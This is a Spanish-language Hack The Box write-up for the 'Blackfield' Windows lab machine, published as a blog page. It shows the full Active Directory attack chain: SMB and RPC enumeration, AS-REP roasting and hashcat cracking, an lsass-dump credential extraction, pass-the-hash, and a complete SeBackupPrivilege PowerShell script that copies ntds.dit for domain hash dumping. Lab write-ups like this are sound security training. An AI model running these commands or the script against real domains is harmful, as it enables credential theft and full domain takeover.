@@ -1,0 +1,508 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Blackfiel Writeup - GRAIL TEAM</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="GRAIL TEAM,"> 
+    <meta name="description" content="EnumeraciónEnumeración de puertos 
+nmap -p- --open -v -n -T5 -Pn 10.10.10.102
+Enumeracion con el sc,"> 
+    <meta name="author" content="GRAIL TEAM"> 
+    <link rel="alternative" href="atom.xml" title="GRAIL TEAM" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">GRAIL TEAM</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://formacion.ctgrail.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">Blackfiel Writeup</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/Windows"><b>「
+                    </b>WINDOWS<b> 」</b></a>
+                
+                June 26, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/06/26/Blackfield/" title="Blackfiel Writeup" class="">Blackfiel Writeup</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    12k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    11 mins.
+                </span>
+                
+                
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/HTB/" rel="tag">HTB</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/Windows/" rel="tag">Windows</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h1 id="Enumeracion"><a href="#Enumeracion" class="headerlink" title="Enumeración"></a>Enumeración</h1><p>Enumeración de puertos </p>
+<pre><code class="bash">nmap -p- --open -v -n -T5 -Pn 10.10.10.102</code></pre>
+<p>Enumeracion con el script por defecto con los puertos obtenidos del escaneo anterior.</p>
+<pre><code class="bash">nmap -sC -sV -p53,445,135,5985,88,389,3268 -oN allports -Pn blackfield.htb</code></pre>
+<blockquote>
+<p>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain?<br>| fingerprint-strings:<br>|   DNSVersionBindReqTCP:<br>|     version<br>|_    bind<br>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-20 22:32:15Z)<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)<br>445/tcp  open  microsoft-ds?<br>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)<br>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a target="_blank" rel="noopener" href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br>SF-Port53-TCP:V=7.80%I=7%D=6/20%Time=5EEE2BD1%P=x86_64-pc-linux-gnu%r(DNSV<br>SF:ersionBindReqTCP,20,”\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version<br>SF:x04bind\0\0\x10\0\x03”);<br>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+</blockquote>
+<blockquote>
+<p>Host script results:<br>|<em>clock-skew: 7h00m49s<br>| smb2-security-mode:<br>|   2.02:<br>|</em>    Message signing enabled and required<br>| smb2-time:<br>|   date: 2020-06-20T22:34:36<br>|_  start_date: N/A</p>
+</blockquote>
+<p>Vemos que hay el puerto 445 abierto, hacemos un null session para listar los directiorios y obtenemos la siguiente respuesta:</p>
+<pre><code>smbclient -L //10.10.10.192 -N_
+</code></pre>
+<blockquote>
+<pre><code>   Sharename       Type      Comment
+  ---------       ----      -------
+   ADMIN$          Disk      Remote Admin
+   C$              Disk      Default share
+   forensic        Disk      Forensic / Audit share.
+   IPC$            IPC       Remote IPC
+   NETLOGON        Disk      Logon server share
+   profiles$       Disk
+   SYSVOL          Disk      Logon server share</code></pre>
+</blockquote>
+<p>El siguiente passo és enumerar esos directorios para hacerlo utilizaremos ==smbclient \\&lt;IP<I>&gt;\&lt;Directorio<D>&gt; -N==</p>
+<p>Peró queremos automatizarlo por no ir uno a uno para ello creamos el siguiente script en bash muy basico. </p>
+<p>Una vez listado los directorios creamos un pequeño script para guardarlos en un fixero. </p>
+<pre><code class="bash">smbclient -L //10.10.10.192/ -N &gt; f.txt &amp;&amp; cat f.txt | awk &#39;&#123;print $1&#125;&#39; | tail -n +4 &gt; folders.txt &amp;&amp; rm f.txt</code></pre>
+<p>Y vemos y listamos todos los que tenemos permisos. </p>
+<pre><code class="bash">for fol in $(cat folders.txt); do echo -n &quot;Try: $fol - \n&quot;; smbclient //10.10.10.192/$fol -c dir -N;done</code></pre>
+<p>Vemos una larga lista de los usuarios asi que lo guardamos en un documento para hacer fuerza bruta y enumerar. </p>
+<pre><code class="bash">smbclient //10.10.10.192/profiles$ -N -c dir &gt; tempusers.txt; cat tempusers.txt | awk &#39;&#123;print $1&#125;&#39; &gt; users.txt; rm tempusers.txt</code></pre>
+<p>Ahora con un bucle for probamos haber los usuarios que existen y si alguno se puede loguear con null session.</p>
+<pre><code class="bash">#!/bin/bash
+for user in $(cat users.txt); do
+
+    msn=$(rpcclient 10.10.10.192 -U $user -N | tail -1)
+
+    if [[ $(echo &quot;$msn&quot; | grep -v &quot;ACCESS_DENIED&quot;) ]]; then
+            echo &quot;User exist: $user&quot;
+    fi
+done</code></pre>
+<p>El output és el siguiente, vemos que ninguno de ellos és possible tener una session nula.</p>
+<blockquote>
+<p><em>User exist: audit2020</em><br><em>User exist: support</em><br><em>User exist: svc_backup</em></p>
+</blockquote>
+<h1 id="USER-1-support"><a href="#USER-1-support" class="headerlink" title="USER 1 : support"></a>USER 1 : support</h1><p>Los metemos en un fichero, que se llamara users.txt.<br>Utilizaremos el script GetNPUser.py_, para lograr los tickets de kerberos que no necessita preautentificación. <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/abusing-kerberos-using-impacket/"> Clica para más información </a></p>
+<pre><code class="bash">GetNPUsers.py BLACKFIELD.local/ -usersfile users.txt -request -dc-ip 10.10.10.192</code></pre>
+<blockquote>
+<p>$krb5asrep$23$support@BLACKFIELD.LOCAL:f72434fff2bed49682c2566af5b92e1d$62bd6347ae54e6f0172703c53c383b0afed413e3396f6b79d1315e58f8817f04e316ca720cdb6faf15e4049fa822fb5d5c0069d1db841a30fb0bb7bfb599f5f88ee0305eb3ef87e8121a18def9e4e5a3756e9d39a76978dfee3127ef40684b646e28eea5bd7ed0a6180ac3572a97650c8ed499275b27785e437d7e81679fb6582e4c7212497509eb59fe67088cea8414131a885449928aca9ae9a780e51a8acb96993311ee0d042a47ac5e3f29b24044adff29f6dbeb5b2bea6e3a7b65b4c034e4fa99f0bfc85bf9c60758997522d7f50abf5edab22778bafb2d27439fa2897280460cf2b7aee9b7738a2bf2d094b054f9aaf039`</p>
+</blockquote>
+<p>Guardamos este output en un archivo llamado support.hash y con hashcat procedemos a lograr la contraseña de kerbereos. <a target="_blank" rel="noopener" href="https://github.com/frizb/Hashcat-Cheatsheet#cracking-hashes-from-kerboroasting---krb5tgs">Hashcat Cheat sheet</a></p>
+<pre><code class="bash">hashcat -m 18200 -a 0 -w 3 support.hash /usr/share/wordlists/rockyou.txt --force</code></pre>
+<p>Obtenemos la siguiente respuesta<br><code>#00^BlackKnight</code></p>
+<h1 id="USER-2-audit2020"><a href="#USER-2-audit2020" class="headerlink" title="USER 2 : audit2020"></a>USER 2 : audit2020</h1><p>Vemos que tenemos acceso desde rpcclient y los permisos que tenemos como usuario nos permite cambiar la password RPC del user audit2020, primero introduciendo la nueva contraseña del usuario y luego la del usuario support. </p>
+<p><img src="https://i.imgur.com/RsFzDEt.png"></p>
+<h1 id="USER-3-svc-backup"><a href="#USER-3-svc-backup" class="headerlink" title="USER 3 : svc_backup"></a>USER 3 : svc_backup</h1><p>Ahora tenemos de nuevo accesos a mas directiorios del samba concretamente al forensics.</p>
+<pre><code class="bash">smbclient \\\\10.10.10.192\\forensic --user=audit2020%Test1234 -c &#39;prompt OFF;recurse ON; cd memory_analysis; mget *&#39;</code></pre>
+<p>Vemos que hay un zip que se llama lssa descomprimimos y podemos ver credenciales dentro. Con lo siguiente: </p>
+<pre><code class="bash">pypykatz lsa minidump lsass.DMP</code></pre>
+<p>Como información importante e interesante encontramos esto. </p>
+<blockquote>
+<p>== MSV ==<br>        Username: svc_backup<br>        Domain: BLACKFIELD<br>        LM: NA<br>        NT: 9658d1d1dcd9250115e2205d9f48400d<br>        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c</p>
+</blockquote>
+<p>Vemos directamente que és possible loguearnos haciendo un pass de hash en evil-winrm </p>
+<p><img src="https://i.imgur.com/UBkhp59.png"></p>
+<h1 id="Escalacion-de-privilegios-Administrator"><a href="#Escalacion-de-privilegios-Administrator" class="headerlink" title="Escalación de privilegios : Administrator"></a>Escalación de privilegios : Administrator</h1><p>Hacemos la enumeración basica para escalación de privilegios.</p>
+<p>Iniciamos con un ==whoami /all== y vemos información interesante en los privilegios. </p>
+<p><img src="https://i.imgur.com/Oz4ITL8.png"></p>
+<h2 id="Preparacion-del-exploit"><a href="#Preparacion-del-exploit" class="headerlink" title="Preparación del exploit"></a>Preparación del exploit</h2><p>Buscamos como extraer el archivo NTDS.dit y el registro del sistema ya que nuestro usuario tiene permisos de backup.<br>El script que usamos es necessario <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow">DiskShadow</a> para copiar y extraer información al volumen Shadow.</p>
+<p>Para abusar de este script primero es necessario tener descargado estos dos dll que los encontramos en el repositorio <em><a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug</a></em></p>
+<p>A mi personalmente me gusta crear un directiorio temporal para ser el menos visible y asi és mucho más fàcil trabajar desde allí.</p>
+<p>Subimos los archivos en ese directorio. </p>
+<p><img src="https://i.imgur.com/Ww2qr7Y.png"></p>
+<p>Y ahora nos descargamos el siguiente script automatizado para lograr la escalación de privilegios. <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/return-z/SeBackupPrivilege-Abuse/master/SeBackupPrivAbuse.ps1">SeBackupPrivAbuse.ps1</a></p>
+<pre><code class="powershell">#PS Script to use the SeBackupPrivilege for extracting the ntds.dit file and reg system file
+#Purely for educational purposes. Illegal purposes are not intended.
+#Not completely my ideas. Taken from a few sources and put together in one place.
+
+$current_path = Get-Location
+
+#Uncomment the lines below if https connenction is allowed or working, otherwise download the dlls and save on the machine
+#Invoke-WebRequest -Uri &quot;https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll&quot; -OutFile &quot;SeBackupPrivilegeUtils.dll&quot;
+#Invoke-WebRequest -Uri &quot;https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll&quot; -OutFile &quot;SeBackupPrivilegeCmdLets.dll&quot;
+
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Set-SeBackupPrivilege
+
+#set ACL in the windows folder
+$path = &quot;C:\windows\&quot;
+$user = &quot;DOMAIN\USER&quot;     #EDIT THIS LINE BEFORE USAGE
+$acl = get-acl -Path $path
+$acl_rule = $user,&#39;FullControl&#39;,&#39;ContainerInherit,ObjectInherit&#39;,&#39;None&#39;,&#39;Allow&#39;
+$access_rule = New-Object System.Security.AccessControl.FileSystemAccessRule $acl_rule
+$acl.AddAccessRule($access_rule)
+Set-Acl -Path $path -AclObject $acl
+
+#Creating a script file for DiskShadow
+&quot;set metadata C:\windows\temp\metadata.cab&quot; | Out-File script.txt -encoding ascii
+&quot;set context persistent nowriters&quot; | Out-File script.txt -encoding ascii -append
+&quot;begin backup&quot; | Out-File script.txt -encoding ascii -append
+&quot;add volume c: alias mydrive&quot; | Out-File script.txt -encoding ascii -append
+&quot;create&quot; | Out-File script.txt -encoding ascii -append
+&quot;expose %mydrive% k:&quot; | Out-File script.txt -encoding ascii -append
+
+#Using DiskShadow to get create a Volume Shadow Copy
+cd /windows/system32
+cmd /c &quot;diskshadow.exe /s $current_path\\script.txt&quot;
+Copy-FileSeBackupPrivilege k:\windows\ntds\ntds.dit $current_path\\ntds.dit -Overwrite
+cd $current_path
+del script.txt
+
+#Cleanup 
+&quot;delete shadows exposed k:&quot; | Out-File script.txt -encoding ascii -append
+&quot;exit&quot; | Out-File script.txt -encoding ascii -append
+cd /windows/system32
+cmd /c &quot;diskshadow.exe /s $current_path\\script.txt&quot;
+cd $current_path
+del script.txt
+
+#Get the system registry hive
+cmd /c &quot;reg.exe save hklm\system .\system.bak&quot;
+</code></pre>
+<p>Ahora obtendremos los dos ficheros, los descargamos para poder<br>obtener el hash Administrador, utilizando SecretsDump.py_.</p>
+<p><img src="https://i.imgur.com/bz5s05Q.png"></p>
+<p>Accedemos al user Administrator y obtenemos la flag del root.</p>
+<p><img src="https://i.imgur.com/bqzx0ig.png"><br></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>GRAIL TEAM</p>
+                    <span>La calidad nunca es un accidente, siempre es resultado de un esfuerzo de la inteligencia (John Ruskiin)</span>
+                    <dl>
+                        <dd><a href="#" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="#" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="#" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">4 <p>Articles</p></a></li>
+                    <li><a href="/categories">21 <p>Categories</p></a></li>
+                    <li><a href="/tags">5 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeracion"><span class="toc-number">1.</span> <span class="toc-text">Enumeración</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#USER-1-support"><span class="toc-number">2.</span> <span class="toc-text">USER 1 : support</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#USER-2-audit2020"><span class="toc-number">3.</span> <span class="toc-text">USER 2 : audit2020</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#USER-3-svc-backup"><span class="toc-number">4.</span> <span class="toc-text">USER 3 : svc_backup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Escalacion-de-privilegios-Administrator"><span class="toc-number">5.</span> <span class="toc-text">Escalación de privilegios : Administrator</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preparacion-del-exploit"><span class="toc-number">5.1.</span> <span class="toc-text">Preparación del exploit</span></a></li></ol></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2021
+        <span class="gradient-text">
+            GRAIL TEAM
+        </span>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+ 
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+ 
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+ 
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+ 
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+ 
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+   
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+  
+
+<script>
+  function initialTyped() {
+    var typedTextEl = $('.typed-text');
+    if (typedTextEl && typedTextEl.length > 0) {
+      var typed = new Typed('.typed-text', {
+        strings: ['La calidad nunca es un accidente, siempre es resultado de un esfuerzo de la inteligencia (John Ruskiin)', 'Lo que creemos que ya sabemos es a menudo lo que previene que aprendamos (Claude Bernard)'],
+        typeSpeed: 90,
+        loop: true,
+        loopCount: Infinity,
+        backSpeed: 20,
+      });
+    }
+  }
+
+  if ($('.article-header') && $('.article-header').length) {
+    $(document).ready(function () {
+      initialTyped();
+    });
+  }
+</script>
+
+
+
+
+
+
+</html>
